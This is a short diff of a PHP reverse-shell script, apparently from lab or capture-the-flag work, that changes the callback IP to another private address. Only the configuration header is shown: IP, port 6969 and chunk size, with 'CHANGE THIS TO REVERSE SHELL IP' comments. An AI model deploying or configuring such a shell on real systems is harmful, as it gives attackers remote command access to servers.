@@ -2,7 +2,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.202.130';  // CHANGE THIS TO REVERSE SHELL IP
+$ip = '10.14.36.110';  // CHANGE THIS TO REVERSE SHELL IP
 $port = 6969;       // CHANGE THIS FOR YOUR PORT
 $chunk_size = 1400;
 $write_a = null;
